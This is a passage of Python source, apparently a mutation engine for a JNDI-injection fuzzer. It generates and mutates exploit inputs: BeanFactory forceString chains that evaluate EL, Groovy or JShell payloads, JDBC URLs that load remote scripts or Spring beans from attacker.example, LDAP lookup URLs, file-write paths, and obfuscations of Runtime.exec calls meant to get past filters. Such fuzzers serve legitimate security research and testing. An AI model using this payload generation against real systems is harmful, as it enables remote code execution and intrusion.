            key = (factory_class, ref_class, method_invoked or "")
            entry = self._reachability_map.get(key)
            if entry is None:
                self._reachability_map[key] = {
                    "sinks": set(sinks_hit),
                    "count": 1,
                }
                logger.info(
                    "JNDI: reachability %s→%s.%s → sinks=%s",
                    factory_class.rsplit(".", 1)[-1],
                    ref_class.rsplit(".", 1)[-1] if ref_class else "?",
                    method_invoked or "?",
                    sinks_hit,
                )
            else:
                entry["sinks"].update(sinks_hit)
                entry["count"] += 1

        # ── Phase 4: JDBC driver availability ─────────────────────
        jdbc_driver = hint.get("jdbc_driver")
        if jdbc_driver:
            self._available_drivers.add(jdbc_driver)

        # ── Method introspection (typed signatures) ─────────────────
        if "string_methods" in hint:
            raw_methods = hint["string_methods"]
            if ref_class and isinstance(raw_methods, list) and raw_methods:
                if ref_class not in self._introspected_methods:
                    parsed: list[dict[str, str]] = []
                    for entry in raw_methods:
                        if isinstance(entry, str) and ":" in entry:
                            name, ret = entry.split(":", 1)
                            parsed.append({"name": name, "return_type": ret})
                        elif isinstance(entry, str):
                            # Backwards compat: plain method name
                            parsed.append({"name": entry, "return_type": "void"})
                    self._introspected_methods[ref_class] = parsed
                    logger.info(
                        "JNDI: introspected %s → %d methods: %s",
                        ref_class.rsplit(".", 1)[-1],
                        len(parsed),
                        ", ".join(m["name"] for m in parsed[:10]),
                    )

    # ------------------------------------------------------------------
    # Helpers
    # ------------------------------------------------------------------

    def _get_ir(self, ir: dict[str, Any]) -> dict[str, Any]:
        return copy.deepcopy(ir)

    def _is_available(self, cls: str) -> bool:
        """Check if a class is NOT in the unavailable cache."""
        return cls not in self._unavailable_classes

    def _all_factory_classes(self) -> list[str]:
        """All known factory classes, filtered by classpath availability."""
        all_cls = _FACTORY_CLASSES + list(self._discovered_factories.keys())
        # After probe warmup, filter to available factories only
        if self._available_factories:
            available = [c for c in all_cls if c in self._available_factories]
            return available if available else all_cls
        # During/before warmup, filter out known-unavailable only
        return [c for c in all_cls if self._is_available(c)]

    def _get_factory_info(self, cls: str) -> dict[str, Any] | None:
        """Get factory info from built-in or discovered database."""
        if cls in FACTORY_DATABASE:
            return FACTORY_DATABASE[cls]
        return self._discovered_factories.get(cls)

    def _expected_reference_class(
        self, factory_info: dict[str, Any], sink: str,
    ) -> str | None:
        explicit = factory_info.get("reference_class")
        if explicit:
            return explicit

        pattern = factory_info.get("pattern", "")
        if pattern == "bean_factory_reflection":
            ref_classes = factory_info.get("reference_classes", {})
            choices = ref_classes.get(sink, [])
            if choices:
                return choices[0]

        return _PATTERN_REFERENCE_CLASSES.get(pattern)

    def _normalize_ir_contract(self, ir: dict[str, Any]) -> None:
        """Repair common factory/reference/attribute mismatches."""
        factory = ir.get("factory_class", "")
        factory_info = FACTORY_DATABASE.get(factory)
        if not factory_info:
            return

        sink = ir.get("sink_type", "")
        attrs = ir.setdefault("factory_attrs", {})
        if not isinstance(attrs, dict):
            ir["factory_attrs"] = {}
            attrs = ir["factory_attrs"]

        expected_ref = self._expected_reference_class(factory_info, sink)
        if expected_ref:
            ir["reference_class"] = expected_ref

        template = factory_info.get("attrs_template", {})
        for key, value in template.items():
            attrs.setdefault(key, value)

        pattern = factory_info.get("pattern", "")
        if pattern == "bean_factory_reflection":
            method_map = factory_info.get("forcestring_methods", {})
            expected_method = method_map.get(sink)
            # Multi-step chains: MLet (addURL+loadClass), GroovyClassLoader (addClasspath+loadClass)
            if sink == "mlet_classload" and "forceString" not in attrs:
                attrs["forceString"] = "a=addURL,b=loadClass"
                if "a" not in attrs:
                    payloads = _SINK_TO_PAYLOADS.get(sink, MLET_PAYLOADS)
                    attrs["a"] = self.rng.choice(payloads)
                if "b" not in attrs:
                    attrs["b"] = "Exploit"
            elif sink == "groovy_classload" and "forceString" not in attrs:
                attrs["forceString"] = "a=addClasspath,b=loadClass"
                if "a" not in attrs:
                    payloads = _SINK_TO_PAYLOADS.get(sink, GROOVY_CLASSLOAD_PAYLOADS)
                    attrs["a"] = self.rng.choice(payloads)
                if "b" not in attrs:
                    attrs["b"] = "Exploit"
            elif expected_method and "forceString" not in attrs:
                attrs["forceString"] = f"x={expected_method}"
            if "x" not in attrs and sink not in ("mlet_classload", "groovy_classload"):
                payloads = _SINK_TO_PAYLOADS.get(sink, EL_PAYLOADS)
                attrs["x"] = self.rng.choice(payloads)
            return

        if pattern == "datasource_jdbc":
            url_attr = factory_info.get("url_attr", "url")
            driver_attr = factory_info.get("driver_attr", "driverClassName")
            needs_url = url_attr not in attrs
            needs_driver = bool(driver_attr) and driver_attr not in attrs
            if needs_url or needs_driver:
                compatible = factory_info.get("compatible_sinks", [])
                chosen_sink = sink or (compatible[0] if compatible else "jdbc_h2_runscript")
                ir["sink_type"] = chosen_sink
                self._update_attrs_for_factory(ir, factory, chosen_sink)
                attrs = ir.setdefault("factory_attrs", {})
                for key, value in template.items():
                    attrs.setdefault(key, value)
            return

        if pattern == "bean_reflection":
            # C3P0 JavaBeanObjectFactory: apply c3p0_attrs for C3P0 DataSource beans
            c3p0_attrs = factory_info.get("c3p0_attrs", {})
            ref_class = ir.get("reference_class", "")
            if ref_class in c3p0_attrs:
                for key, value in c3p0_attrs[ref_class].items():
                    attrs.setdefault(key, value)
            return

        if pattern == "file_write":
            if "pathname" not in attrs or "readonly" not in attrs:
                self._update_attrs_for_factory(ir, factory, "file_write")

    def _repair_timeout_prone_input(self, ir: dict[str, Any]) -> dict[str, Any]:
        """Shift timeout-prone JNDI inputs toward faster local sink paths."""
        out = self._get_ir(ir)
        factory = out.get("factory_class", "")
        factory_info = FACTORY_DATABASE.get(factory, {})
        pattern = factory_info.get("pattern", "")
        compatible = factory_info.get("compatible_sinks", [])

        if pattern == "datasource_jdbc":
            new_sink = next(
                (
                    s for s in ("jdbc_hsqldb_call", "jdbc_h2_alias", "jdbc_h2_runscript")
                    if s in compatible
                ),
                None,
            )
            if new_sink is None:
                out["factory_class"] = "org.hsqldb.jdbc.JDBCDataSourceFactory"
                factory = out["factory_class"]
                new_sink = "jdbc_hsqldb_call"
            out["sink_type"] = new_sink
            self._update_attrs_for_factory(out, factory, new_sink)
        elif pattern == "bean_factory_reflection":
            new_sink = next(
                (
                    s for s in ("el_eval", "jshell_eval", "bsh_eval", "groovy_eval", "yaml_load")
                    if s in compatible
                ),
                "el_eval",
            )
            out["sink_type"] = new_sink
            self._update_attrs_for_factory(out, factory, new_sink)
        elif pattern == "file_write":
            out["sink_type"] = "file_write"
            self._update_attrs_for_factory(out, factory, "file_write")
        else:
            out["factory_class"] = "org.apache.catalina.users.MemoryUserDatabaseFactory"
            out["sink_type"] = "file_write"
            self._update_attrs_for_factory(
                out,
                out["factory_class"],
                "file_write",
            )

        out["protocol"] = "ldap"
        self._normalize_ir_contract(out)
        return out

    # ------------------------------------------------------------------
    # J1: Factory class mutation
    # ------------------------------------------------------------------

    def _factory_swap(
        self, ir: dict[str, Any], corpus: list[Seed],
    ) -> dict[str, Any] | None:
        """Swap factory class to another known ObjectFactory."""
        out = self._get_ir(ir)
        current = out.get("factory_class", "")
        candidates = [c for c in self._all_factory_classes() if c != current]
        if not candidates:
            return None

        new_factory = self.rng.choice(candidates)
        out["factory_class"] = new_factory

        # Update attributes to match new factory's pattern
        factory_info = FACTORY_DATABASE.get(new_factory)
        if factory_info:
            sinks = factory_info.get("compatible_sinks", [])
            if sinks:
                new_sink = self.rng.choice(sinks)
                out["sink_type"] = new_sink
                self._update_attrs_for_factory(out, new_factory, new_sink)

        return out

    def _factory_discover(
        self, ir: dict[str, Any], corpus: list[Seed],
    ) -> dict[str, Any] | None:
        """Use a scanner-discovered factory not in the built-in database."""
        if not self._discovered_factories:
            # Fall back to factory_swap
            return self._factory_swap(ir, corpus)

        out = self._get_ir(ir)
        discovered = list(self._discovered_factories.keys())
        new_factory = self.rng.choice(discovered)
        out["factory_class"] = new_factory

        entry = self._discovered_factories[new_factory]
        pattern = entry.get("exploitPattern", "unknown")
        if pattern == "bean_factory_reflection":
            out["sink_type"] = self.rng.choice([
                "el_eval", "groovy_eval", "bsh_eval",
            ])
        elif pattern == "datasource_jdbc":
            out["sink_type"] = self.rng.choice([
                "jdbc_h2_runscript", "jdbc_hsqldb_call",
                "jdbc_pgsql_socketfactory",
            ])
        elif pattern == "file_write":
            out["sink_type"] = "file_write"
        elif pattern == "jndi_chain":
            out["sink_type"] = "jndi_relookup"

        # Generate seed template from scanner output if available
        seed_template = entry.get("seedTemplate")
        if seed_template and isinstance(seed_template, dict):
            attrs = seed_template.get("factory_attrs")
            if attrs:
                out["factory_attrs"] = copy.deepcopy(attrs)

        return out

    def _update_attrs_for_factory(
        self, ir: dict[str, Any], factory: str, sink: str,
    ) -> None:
        """Update factory_attrs to be consistent with factory + sink."""
        factory_info = FACTORY_DATABASE.get(factory, {})
        pattern = factory_info.get("pattern", "")

        if pattern == "bean_factory_reflection":
            # BeanFactory: forceString + expression payload
            ref_classes = factory_info.get("reference_classes", {})
            method_map = factory_info.get("forcestring_methods", {})
            ref_class_list = ref_classes.get(sink, ["javax.el.ELProcessor"])
            method = method_map.get(sink, "eval")
            payloads = _SINK_TO_PAYLOADS.get(sink, EL_PAYLOADS)

            ir["reference_class"] = self.rng.choice(ref_class_list)
            ir["factory_attrs"] = {
                "forceString": f"x={method}",
                "x": self.rng.choice(payloads),
            }

        elif pattern == "datasource_jdbc":
            jdbc_info = JDBC_EXPLOITS.get(sink, {})
            urls = jdbc_info.get("urls", [
                "jdbc:h2:mem:test;INIT=RUNSCRIPT FROM 'http://attacker.example/evil.sql'"
            ])
            driver = jdbc_info.get("driver", "org.h2.Driver")
            url_attr = factory_info.get("url_attr", "url")
            driver_attr = factory_info.get("driver_attr", "driverClassName")

            expected_ref = self._expected_reference_class(factory_info, sink)
            if expected_ref:
                ir["reference_class"] = expected_ref
            ir["factory_attrs"] = {url_attr: self.rng.choice(urls)}
            if driver_attr:
                ir["factory_attrs"][driver_attr] = driver

            for key, value in factory_info.get("attrs_template", {}).items():
                ir["factory_attrs"].setdefault(key, value)

            # Add initSQL if supported
            extra = factory_info.get("extra_attrs", {})
            if extra:
                init_sqls = jdbc_info.get("init_sqls", [])
                for attr_name, enabled in extra.items():
                    if enabled and init_sqls:
                        ir["factory_attrs"][attr_name] = self.rng.choice(init_sqls)

        elif pattern == "file_write":
            attrs = factory_info.get("attrs_template", {})
            ir["factory_attrs"] = copy.deepcopy(attrs)
            # MemoryUserDatabaseFactory checks for the interface name.
            ir["reference_class"] = "org.apache.catalina.UserDatabase"

    # ------------------------------------------------------------------
    # J2: Reference attribute mutation
    # ------------------------------------------------------------------

    def _attr_inject(
        self, ir: dict[str, Any], corpus: list[Seed],
    ) -> dict[str, Any] | None:
        """Inject or modify a Reference attribute."""
        out = self._get_ir(ir)
        attrs = out.setdefault("factory_attrs", {})

        # Mutation options based on current factory pattern
        factory = out.get("factory_class", "")
        factory_info = FACTORY_DATABASE.get(factory, {})
        pattern = factory_info.get("pattern", "")

        if pattern == "bean_factory_reflection":
            # Mutate forceString property name
            props = ["x", "y", "z", "a", "cmd", "payload", "command"]
            sink = out.get("sink_type", "el_eval")
            method_map = factory_info.get("forcestring_methods", {})
            method = method_map.get(sink, "eval")
            prop = self.rng.choice(props)
            attrs["forceString"] = f"{prop}={method}"
            # Move payload to new property
            old_prop_keys = [k for k in attrs if k not in ("forceString",)]
            payload = ""
            for k in old_prop_keys:
                payload = attrs.pop(k)
            if not payload:
                payloads = _SINK_TO_PAYLOADS.get(sink, EL_PAYLOADS)
                payload = self.rng.choice(payloads)
            attrs[prop] = payload

        elif pattern == "datasource_jdbc":
            # Add extra JDBC connection properties
            extra_props = {
                "maxActive": "1",
                "maxIdle": "1",
                "maxWaitMillis": "1000",
                "validationQuery": "SELECT 1",
                "testOnBorrow": "true",
                "removeAbandoned": "true",
                "logAbandoned": "true",
            }
            prop = self.rng.choice(list(extra_props.keys()))
            attrs[prop] = extra_props[prop]

        elif pattern == "file_write":
            # Mutate path
            attrs["pathname"] = self.rng.choice(FILE_WRITE_PATHS)

        else:
            # Generic: inject a random attribute
            generic_attrs = {
                "className": "java.lang.Runtime",
                "factoryLocation": "http://attacker.example/",
                "url": "ldap://attacker.example/exploit",
            }
            attr = self.rng.choice(list(generic_attrs.keys()))
            attrs[attr] = generic_attrs[attr]

        return out

    def _forcestring_mutate(
        self, ir: dict[str, Any], corpus: list[Seed],
    ) -> dict[str, Any] | None:
        """Mutate forceString mappings for BeanFactory-like factories."""
        out = self._get_ir(ir)
        attrs = out.get("factory_attrs", {})

        # Generate multi-property forceString
        methods = [
            "eval", "exec", "execute", "evaluate", "load", "fromXML",
            "parse", "compile", "run", "start", "connect", "invoke",
            "doLookup", "lookup", "getConnection",
        ]
        num_props = self.rng.randint(1, 3)
        props = []
        for i in range(num_props):
            name = chr(ord('a') + i)
            method = self.rng.choice(methods)
            props.append(f"{name}={method}")

        attrs["forceString"] = ",".join(props)

        # Set payload for first property
        sink = out.get("sink_type", "el_eval")
        payloads = _SINK_TO_PAYLOADS.get(sink, EL_PAYLOADS)
        first_prop = props[0].split("=")[0]
        attrs[first_prop] = self.rng.choice(payloads)

        return out

    def _attr_havoc(
        self, ir: dict[str, Any], corpus: list[Seed],
    ) -> dict[str, Any] | None:
        """Randomly modify, add, or remove an attribute."""
        out = self._get_ir(ir)
        attrs = out.setdefault("factory_attrs", {})
        if not attrs:
            return None

        action = self.rng.choice(["modify", "add", "remove", "duplicate"])

        if action == "modify" and attrs:
            key = self.rng.choice(list(attrs.keys()))
            val = attrs[key]
            if isinstance(val, str):
                # Apply string mutations
                mutations = [
                    lambda s: s.upper(),
                    lambda s: s + "\x00",
                    lambda s: s + " ",
                    lambda s: "${" + s + "}",  # Log4j-style injection test
                    lambda s: s.replace("'", "\""),
                    lambda s: s.replace(".", "/"),
                    lambda s: "../" + s,
                ]
                attrs[key] = self.rng.choice(mutations)(val)

        elif action == "add":
            new_attrs = {
                "scope": "singleton",
                "auth": "Container",
                "description": "test",
                "factory": out.get("factory_class", ""),
                "type": out.get("reference_class", ""),
            }
            k = self.rng.choice(list(new_attrs.keys()))
            attrs[k] = new_attrs[k]

        elif action == "remove" and len(attrs) > 1:
            key = self.rng.choice(list(attrs.keys()))
            del attrs[key]

        elif action == "duplicate" and attrs:
            key = self.rng.choice(list(attrs.keys()))
            attrs[key + "2"] = attrs[key]

        return out

    # ------------------------------------------------------------------
    # J3: Sink expression mutation
    # ------------------------------------------------------------------

    def _sink_payload_swap(
        self, ir: dict[str, Any], corpus: list[Seed],
    ) -> dict[str, Any] | None:
        """Swap the sink expression payload for an alternative."""
        out = self._get_ir(ir)
        sink = out.get("sink_type", "")
        payloads = _SINK_TO_PAYLOADS.get(sink)

        if payloads:
            attrs = out.get("factory_attrs", {})
            # Find the payload attribute (not forceString, not driver-related)
            payload_keys = [
                k for k in attrs
                if k not in ("forceString", "driverClassName", "url",
                             "jdbcUrl", "pathname", "readonly")
            ]
            if payload_keys:
                key = self.rng.choice(payload_keys)
                attrs[key] = self.rng.choice(payloads)
            return out

        # For JDBC sinks, swap the URL
        if sink.startswith("jdbc_"):
            jdbc_info = JDBC_EXPLOITS.get(sink, {})
            urls = jdbc_info.get("urls", [])
            if urls:
                attrs = out.get("factory_attrs", {})
                url_key = "url"
                for k in ("jdbcUrl", "url"):
                    if k in attrs:
                        url_key = k
                        break
                attrs[url_key] = self.rng.choice(urls)
                return out

        return None

    def _sink_type_swap(
        self, ir: dict[str, Any], corpus: list[Seed],
    ) -> dict[str, Any] | None:
        """Change sink type and update factory_attrs accordingly."""
        out = self._get_ir(ir)
        factory = out.get("factory_class", "")
        factory_info = FACTORY_DATABASE.get(factory, {})
        compatible = factory_info.get("compatible_sinks", [])

        if not compatible:
            return None

        current_sink = out.get("sink_type", "")
        candidates = [s for s in compatible if s != current_sink]
        if not candidates:
            return None

        new_sink = self.rng.choice(candidates)
        out["sink_type"] = new_sink
        self._update_attrs_for_factory(out, factory, new_sink)
        return out

    def _sink_obfuscate(
        self, ir: dict[str, Any], corpus: list[Seed],
    ) -> dict[str, Any] | None:
        """Obfuscate the sink expression payload."""
        out = self._get_ir(ir)
        attrs = out.get("factory_attrs", {})

        # Find expression attributes
        expr_keys = [
            k for k, v in attrs.items()
            if isinstance(v, str) and any(
                kw in v.lower() for kw in (
                    "runtime", "exec", "processbuilder", "class.forname",
                    "getruntime", "execute",
                )
            )
        ]
        if not expr_keys:
            return None

        key = self.rng.choice(expr_keys)
        expr = attrs[key]

        # Obfuscation techniques
        obfuscations = [
            # String concatenation
            lambda s: s.replace("Runtime", "Run"+"time"),
            # Unicode escape
            lambda s: s.replace("exec", "\\u0065xec"),
            # Reflection indirection
            lambda s: s.replace(
                "Runtime.getRuntime().exec",
                "Class.forName('java.lang.Runtime').getMethod('getRuntime').invoke(null).getClass().getMethod('exec',String.class)",
            ) if "Runtime" in s else s,
            # Whitespace injection
            lambda s: s.replace("(", "( ").replace(")", " )"),
            # Comment injection (for SQL)
            lambda s: s.replace(" ", "/**/") if "CALL" in s else s,
        ]

        attrs[key] = self.rng.choice(obfuscations)(expr)
        return out

    # ------------------------------------------------------------------
    # J4: Protocol/URL mutation
    # ------------------------------------------------------------------

    def _protocol_swap(
        self, ir: dict[str, Any], corpus: list[Seed],
    ) -> dict[str, Any] | None:
        """Change JNDI resolution protocol."""
        out = self._get_ir(ir)
        current = out.get("protocol", "ldap")
        candidates = [p for p in PROTOCOLS if p != current]
        if not candidates:
            return None

        new_proto = self.rng.choice(candidates)
        out["protocol"] = new_proto

        # Update lookup URL
        url = out.get("lookup_url", "")
        if "://" in url:
            _, rest = url.split("://", 1)
            out["lookup_url"] = f"{new_proto}://{rest}"
        else:
            out["lookup_url"] = f"{new_proto}://attacker.example:1389/exploit"

        return out

    def _url_obfuscate(
        self, ir: dict[str, Any], corpus: list[Seed],
    ) -> dict[str, Any] | None:
        """Obfuscate the JNDI lookup URL."""
        out = self._get_ir(ir)
        proto = out.get("protocol", "ldap")
        rand_suffix = f"{self.rng.randint(1000, 9999)}"

        template = self.rng.choice(_URL_OBFUSCATION_TEMPLATES)
        url = template.replace("{proto}", proto)
        url = url.replace("{PROTO}", proto.upper())
        url = url.replace("{random}", rand_suffix)
        out["lookup_url"] = url
        return out

    # ------------------------------------------------------------------
    # J5: JDBC driver exploitation
    # ------------------------------------------------------------------

    def _jdbc_url_swap(
        self, ir: dict[str, Any], corpus: list[Seed],
    ) -> dict[str, Any] | None:
        """Swap JDBC URL to target a different database driver exploit."""
        out = self._get_ir(ir)
        sink = out.get("sink_type", "")
        if not sink.startswith("jdbc_"):
            # Change to a JDBC sink — prefer one with available driver
            if self._available_drivers:
                avail_sinks = [
                    s for s, info in JDBC_EXPLOITS.items()
                    if info.get("driver") in self._available_drivers
                ]
                jdbc_sinks = avail_sinks if avail_sinks else list(JDBC_EXPLOITS.keys())
            else:
                jdbc_sinks = list(JDBC_EXPLOITS.keys())
            sink = self.rng.choice(jdbc_sinks)
            out["sink_type"] = sink

        jdbc_info = JDBC_EXPLOITS.get(sink, {})
        urls = jdbc_info.get("urls", [])
        if not urls:
            return None

        attrs = out.get("factory_attrs", {})
        factory = out.get("factory_class", "")
        factory_info = FACTORY_DATABASE.get(factory, {})
        url_key = factory_info.get("url_attr", "url")
        if url_key not in attrs:
            for k in ("jdbcUrl", "url", "database"):
                if k in attrs:
                    url_key = k
                    break
        attrs[url_key] = self.rng.choice(urls)
        driver_attr = factory_info.get("driver_attr", "driverClassName")
        if driver_attr:
            attrs[driver_attr] = jdbc_info.get("driver", "org.h2.Driver")

        # Ensure factory is a DataSource factory
        if factory_info.get("pattern") != "datasource_jdbc":
            ds_factories = [
                f for f, info in FACTORY_DATABASE.items()
                if info.get("pattern") == "datasource_jdbc"
            ]
            if ds_factories:
                out["factory_class"] = self.rng.choice(ds_factories)
                factory = out["factory_class"]
                factory_info = FACTORY_DATABASE.get(factory, {})

        self._normalize_ir_contract(out)
        return out

    def _jdbc_driver_swap(
        self, ir: dict[str, Any], corpus: list[Seed],
    ) -> dict[str, Any] | None:
        """Swap JDBC driver while keeping compatible URL."""
        out = self._get_ir(ir)
        attrs = out.get("factory_attrs", {})

        # Pick a JDBC exploit — prefer one with available driver
        if self._available_drivers:
            avail_sinks = [
                s for s, info in JDBC_EXPLOITS.items()
                if info.get("driver") in self._available_drivers
            ]
            pool = avail_sinks if avail_sinks else list(JDBC_EXPLOITS.keys())
        else:
            pool = list(JDBC_EXPLOITS.keys())
        sink = self.rng.choice(pool)
        jdbc_info = JDBC_EXPLOITS[sink]

        out["sink_type"] = sink
        factory = out.get("factory_class", "")
        factory_info = FACTORY_DATABASE.get(factory, {})
        driver_attr = factory_info.get("driver_attr", "driverClassName")
        if driver_attr:
            attrs[driver_attr] = jdbc_info["driver"]

        urls = jdbc_info.get("urls", [])
        if urls:
            url_key = factory_info.get("url_attr", "url")
            if url_key not in attrs:
                for k in ("jdbcUrl", "url", "database"):
                    if k in attrs:
                        url_key = k
                        break
            attrs[url_key] = self.rng.choice(urls)

        # Also try alt drivers
        alt_drivers = jdbc_info.get("alt_drivers", [])
        if driver_attr and alt_drivers and self.rng.random() < 0.3:
            attrs[driver_attr] = self.rng.choice(alt_drivers)

        self._normalize_ir_contract(out)
        return out

    def _jdbc_param_inject(
        self, ir: dict[str, Any], corpus: list[Seed],
    ) -> dict[str, Any] | None:
        """Inject JDBC connection parameters for exploitation."""
        out = self._get_ir(ir)
        attrs = out.get("factory_attrs", {})

        # Find the URL attribute
        url_key = "url"
        url = ""
        for k in ("jdbcUrl", "url", "database"):
            if k in attrs and isinstance(attrs[k], str):
                url_key = k
                url = attrs[k]
                break

        if not url:
            return None

        # Inject exploitation parameters based on driver type
        driver = attrs.get("driverClassName", "")
        if not driver:
            sink = out.get("sink_type", "")
            if "h2" in sink or url.startswith("jdbc:h2:"):
                driver = "org.h2.Driver"
            elif "hsqldb" in sink or url.startswith("jdbc:hsqldb:"):
                driver = "org.hsqldb.jdbc.JDBCDriver"
            elif "pgsql" in sink or url.startswith("jdbc:postgresql:"):
                driver = "org.postgresql.Driver"
            elif "mysql" in sink or url.startswith("jdbc:mysql:"):
                driver = "com.mysql.cj.jdbc.Driver"

        if "h2" in driver.lower():
            params = [
                ";INIT=RUNSCRIPT FROM 'http://attacker.example/evil.sql'",
                ";TRACE_LEVEL_SYSTEM_OUT=3",
                ";MODE=MySQL",
                ";INIT=SET ALLOW_LITERALS ALL",
            ]
        elif "hsqldb" in driver.lower():
            params = [
                ";sql.enforce_strict_size=false",
                ";hsqldb.reconfig_logging=false",
            ]
        elif "postgresql" in driver.lower():
            params = [
                "&socketFactory=org.springframework.context.support.ClassPathXmlApplicationContext",
                "&socketFactoryArg=http://attacker.example/bean.xml",
                "&sslfactory=org.springframework.context.support.ClassPathXmlApplicationContext",
                "&loggerLevel=DEBUG&loggerFile=/tmp/pwned",
            ]
        elif "mysql" in driver.lower():
            params = [
                "&autoDeserialize=true",
                "&queryInterceptors=com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor",
                "&allowLoadLocalInfile=true",
                "&allowUrlInLocalInfile=true",
            ]
        else:
            params = ["&user=root", "&password="]

        # Append parameter to URL
        separator = "&" if "?" in url else "?"
        if url.startswith("jdbc:h2:"):
            separator = ";"
        url += self.rng.choice(params)
        attrs[url_key] = url
        self._normalize_ir_contract(out)
        return out

    # ------------------------------------------------------------------
    # J6: Constraint repair
    # ------------------------------------------------------------------

    def _consistency_fix(
        self, ir: dict[str, Any], corpus: list[Seed],
    ) -> dict[str, Any] | None:
        """Fix inconsistencies between factory, sink, and attributes."""
        out = self._get_ir(ir)
        factory = out.get("factory_class", "")
        sink = out.get("sink_type", "")

        # If current factory is known-unavailable, swap to an available one
        if not self._is_available(factory):
            available = self._all_factory_classes()
            if available:
                factory = self.rng.choice(available)
                out["factory_class"] = factory

        factory_info = FACTORY_DATABASE.get(factory)
        if not factory_info:
            # Unknown factory — set to BeanFactory with default config
            fallback = "org.apache.naming.factory.BeanFactory"
            if self._is_available(fallback):
                out["factory_class"] = fallback
            else:
                available = self._all_factory_classes()
                out["factory_class"] = self.rng.choice(available) if available else fallback
            out["sink_type"] = "el_eval"
            ref_class = "javax.el.ELProcessor"
            # Prefer available reference class
            if not self._is_available(ref_class):
                for alt in ("jdk.jshell.JShell", "groovy.lang.GroovyShell", "bsh.Interpreter"):
                    if self._is_available(alt):
                        ref_class = alt
                        out["sink_type"] = {"jdk.jshell.JShell": "jshell_eval",
                                            "groovy.lang.GroovyShell": "groovy_eval",
                                            "bsh.Interpreter": "bsh_eval"}[alt]
                        break
            out["reference_class"] = ref_class
            out["factory_attrs"] = {
                "forceString": "x=eval",
                "x": self.rng.choice(EL_PAYLOADS),
            }
            return out

        compatible = factory_info.get("compatible_sinks", [])
        if compatible and sink not in compatible:
            new_sink = self.rng.choice(compatible)
            out["sink_type"] = new_sink
            self._update_attrs_for_factory(out, factory, new_sink)

        # Filter reference class by availability
        ref_class = out.get("reference_class", "")
        if ref_class and not self._is_available(ref_class):
            # Try to find an available alternative from the factory's ref classes
            ref_map = factory_info.get("reference_classes", {})
            current_sink = out.get("sink_type", "")
            candidates = ref_map.get(current_sink, [])
            available_refs = [c for c in candidates if self._is_available(c)]
            if available_refs:
                out["reference_class"] = self.rng.choice(available_refs)
            elif self._valid_ref_classes:
                out["reference_class"] = self.rng.choice(list(self._valid_ref_classes))

        self._normalize_ir_contract(out)
        return out

    # ------------------------------------------------------------------
    # J7: Exception-guided mutation
    # ------------------------------------------------------------------

    def _exception_guided(
        self, ir: dict[str, Any], corpus: list[Seed],
    ) -> dict[str, Any] | None:
        """Use target feedback to guide mutations."""
        hint = self._last_exception_hint
        if hint is None:
            return self._consistency_fix(ir, corpus)

        out = self._get_ir(ir)
        error_type = hint.get("error_type", "")
        error_msg = hint.get("error_message", "")

        if error_type == "class_not_found":
            # Factory or reference class not on classpath — use availability cache
            # The class has already been added to _unavailable_classes by set_exception_hint
            # Just pick an available alternative
            ref_class = out.get("reference_class", "")
            factory = out.get("factory_class", "")

            if not self._is_available(factory):
                # Factory unavailable — pick an available one
                available = self._all_factory_classes()
                if available:
                    out["factory_class"] = self.rng.choice(available)
                    factory = out["factory_class"]
                    fi = FACTORY_DATABASE.get(factory, {})
                    sinks = fi.get("compatible_sinks", [])
                    if sinks:
                        out["sink_type"] = self.rng.choice(sinks)
                        self._update_attrs_for_factory(out, factory, out["sink_type"])
            elif not self._is_available(ref_class):
                # Reference class unavailable — pick from valid or DB
                if self._valid_ref_classes:
                    out["reference_class"] = self.rng.choice(list(self._valid_ref_classes))
                else:
                    alternatives = [
                        c for c in [
                            "jdk.jshell.JShell", "groovy.lang.GroovyShell",
                            "bsh.Interpreter", "javax.el.ELProcessor",
                            "org.yaml.snakeyaml.Yaml",
                        ] if self._is_available(c)
                    ]
                    if alternatives:
                        out["reference_class"] = self.rng.choice(alternatives)
                    else:
                        out["reference_class"] = self.rng.choice([
                            "jdk.jshell.JShell", "groovy.lang.GroovyShell",
                            "bsh.Interpreter",
                        ])
            return out

        elif error_type == "no_such_method":
            # forceString method doesn't exist on reference class.
            # Use introspected methods from JndiTarget if available,
            # otherwise fall back to generic method dictionary.
            ref_class = out.get("reference_class", "")
            introspected = self._introspected_methods.get(ref_class, [])
            if introspected:
                alt_methods = [m["name"] for m in introspected]
            else:
                alt_methods = [
                    "eval", "execute", "run", "exec", "invoke",
                    "load", "parse", "process", "call",
                ]
            attrs = out.get("factory_attrs", {})
            if "forceString" in attrs:
                prop, _ = attrs["forceString"].split("=", 1)
                new_method = self.rng.choice(alt_methods)
                attrs["forceString"] = f"{prop}={new_method}"
            return out

        elif error_type == "security_exception":
            # Security manager blocking — try less restricted operation
            out["sink_type"] = self.rng.choice([
                "file_write", "jdbc_h2_runscript", "yaml_load",
            ])
            factory = out.get("factory_class", "")
            self._update_attrs_for_factory(
                out, factory, out["sink_type"]
            )
            return out

        elif error_type == "driver_not_found":
            # JDBC driver not on classpath — try an available driver
            if self._available_drivers:
                # Pick a sink whose driver is available
                avail_sinks = [
                    s for s, info in JDBC_EXPLOITS.items()
                    if info.get("driver") in self._available_drivers
                    and s != out.get("sink_type", "")
                ]
                if avail_sinks:
                    new_sink = self.rng.choice(avail_sinks)
                    out["sink_type"] = new_sink
                    factory = out.get("factory_class", "")
                    self._update_attrs_for_factory(out, factory, new_sink)
            else:
                other_sinks = [
                    s for s in JDBC_EXPLOITS if s != out.get("sink_type", "")
                ]
                if other_sinks:
                    new_sink = self.rng.choice(other_sinks)
                    out["sink_type"] = new_sink
                    factory = out.get("factory_class", "")
                    self._update_attrs_for_factory(out, factory, new_sink)
            return out

        # Unknown error — fall back to consistency fix
        if error_type == "timeout":
            return self._repair_timeout_prone_input(out)
        return self._consistency_fix(ir, corpus)

    # ------------------------------------------------------------------
    # J8: Method introspection — use runtime reflection feedback
    # ------------------------------------------------------------------

    # (Hardcoded dangerous method list removed — now auto-classified
    # by _classify_method() using return type + name semantics)

    # Return types that indicate a method is a "loader" (sets up state)
    _LOADER_RETURN_TYPES: set[str] = {"void"}
    # Return types that indicate a method produces an exploitable object
    _EXECUTOR_RETURN_TYPES: set[str] = {
        "java.lang.Class", "java.lang.Object", "java.lang.Process",
        "java.sql.Connection", "javax.sql.DataSource",
    }
    # Semantic categories for automatic 2-step chain discovery
    _LOADER_NAME_PATTERNS: set[str] = {
        "add", "set", "put", "register", "bind", "define", "insert", "load",
    }
    _EXECUTOR_NAME_PATTERNS: set[str] = {
        "get", "create", "find", "lookup", "resolve", "load", "parse",
        "execute", "eval", "run", "invoke", "call",
    }

    def _classify_method(self, m: dict[str, str]) -> str:
